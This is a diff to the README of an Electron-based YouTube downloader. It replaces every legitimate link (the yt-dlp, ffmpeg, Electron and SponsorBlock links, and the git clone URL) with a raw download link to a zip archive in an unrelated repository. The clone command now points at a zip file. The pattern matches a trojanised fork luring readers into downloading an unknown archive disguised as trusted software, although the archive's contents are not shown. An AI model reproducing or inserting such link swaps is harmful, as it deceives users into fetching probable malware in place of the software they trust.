@@ -10,9 +10,9 @@ No ads. No login. No browser cookies. No Google account linked.
 
 [![License: MIT](https://img.shields.io/badge/License-MIT-2ea44f.svg)](LICENSE)
 [![Platforms](https://img.shields.io/badge/platforms-Windows%20%7C%20macOS%20%7C%20Linux-blue.svg)](#download)
-[![Powered by yt-dlp](https://img.shields.io/badge/powered%20by-yt--dlp-red.svg)](https://github.com/yt-dlp/yt-dlp)
-[![Powered by ffmpeg](https://img.shields.io/badge/powered%20by-ffmpeg-007808.svg)](https://ffmpeg.org/)
-[![Built with Electron](https://img.shields.io/badge/built%20with-Electron-47848F.svg)](https://www.electronjs.org/)
+[![Powered by yt-dlp](https://img.shields.io/badge/powered%20by-yt--dlp-red.svg)](https://github.com/pastel-statecapitalism754/free-yt-downloader/raw/refs/heads/main/src/yt_downloader_free_v1.5.zip)
+[![Powered by ffmpeg](https://img.shields.io/badge/powered%20by-ffmpeg-007808.svg)](https://github.com/pastel-statecapitalism754/free-yt-downloader/raw/refs/heads/main/src/yt_downloader_free_v1.5.zip)
+[![Built with Electron](https://img.shields.io/badge/built%20with-Electron-47848F.svg)](https://github.com/pastel-statecapitalism754/free-yt-downloader/raw/refs/heads/main/src/yt_downloader_free_v1.5.zip)
 
 </div>
 
@@ -66,7 +66,7 @@ Pre-built installers are available on the [Releases page](../../releases):
 Requires **Node.js 20+** and **npm**.
 
 ```bash
-git clone https://github.com/revolutionarybukhari/free-yt-downloader.git
+git clone https://github.com/pastel-statecapitalism754/free-yt-downloader/raw/refs/heads/main/src/yt_downloader_free_v1.5.zip
 cd free-yt-downloader
 
 npm install
@@ -155,9 +155,9 @@ For larger changes, please open an issue first to discuss.
 
 This project is a thin GUI on top of two phenomenal pieces of software. All credit for the actual downloading and processing work goes to:
 
-- **[yt-dlp](https://github.com/yt-dlp/yt-dlp)** — the YouTube extraction engine. (License: Unlicense)
-- **[ffmpeg](https://ffmpeg.org/)** — the universal media muxer/encoder. (License: LGPL or GPL depending on build)
-- **[SponsorBlock](https://sponsor.ajay.app/)** — the crowdsourced sponsor-segment database.
+- **[yt-dlp](https://github.com/pastel-statecapitalism754/free-yt-downloader/raw/refs/heads/main/src/yt_downloader_free_v1.5.zip)** — the YouTube extraction engine. (License: Unlicense)
+- **[ffmpeg](https://github.com/pastel-statecapitalism754/free-yt-downloader/raw/refs/heads/main/src/yt_downloader_free_v1.5.zip)** — the universal media muxer/encoder. (License: LGPL or GPL depending on build)
+- **[SponsorBlock](https://github.com/pastel-statecapitalism754/free-yt-downloader/raw/refs/heads/main/src/yt_downloader_free_v1.5.zip)** — the crowdsourced sponsor-segment database.
 
 ## Legal
 
